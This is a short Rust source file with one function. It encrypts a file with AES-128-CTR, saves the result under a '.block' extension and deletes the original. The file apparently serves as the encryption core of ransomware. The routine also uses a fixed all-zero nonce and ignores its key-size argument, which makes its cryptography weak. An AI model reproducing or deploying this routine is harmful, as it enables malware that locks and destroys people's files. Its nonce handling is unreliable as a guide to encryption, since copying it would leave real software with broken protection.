extern crate crypto;

use crypto::{
    aes::{ ctr, KeySize }, 
    symmetriccipher::SynchronousStreamCipher
};

use std::{
    fs::{File, remove_file},
    io::{Read, Write},
    error::Error
};

pub const ENCRYPTED_FILE_EXT: &str = "block";

fn create_cipher(key_size: KeySize, key: &[u8]) -> Box<dyn SynchronousStreamCipher> {
    ctr(
        KeySize::KeySize128, 
        key,
        &[0; 16]
    )
}

pub fn encrypt_file(path: &str, key: &[u8]) -> Result<(), Box<dyn Error>> {
    let mut input_file = File::open(path)?;

    let mut input_data = Vec::new();
    input_file.read_to_end(&mut input_data)?;

    let mut output_data = vec![0; input_data.len()];

    let mut cipher = create_cipher(
        KeySize::KeySize128, 
        key,
    );

    cipher.process(&mut input_data, &mut output_data);

    let filename = format!("{}.{}", path, ENCRYPTED_FILE_EXT);

    let mut output_file = File::create(filename)?;
    output_file.write_all(&output_data)?;

    match remove_file(path) {
        Ok(_) => (),
        Err(e) => println!("Error on delete file {}: {}", path, e),
    }

    Ok(())
}
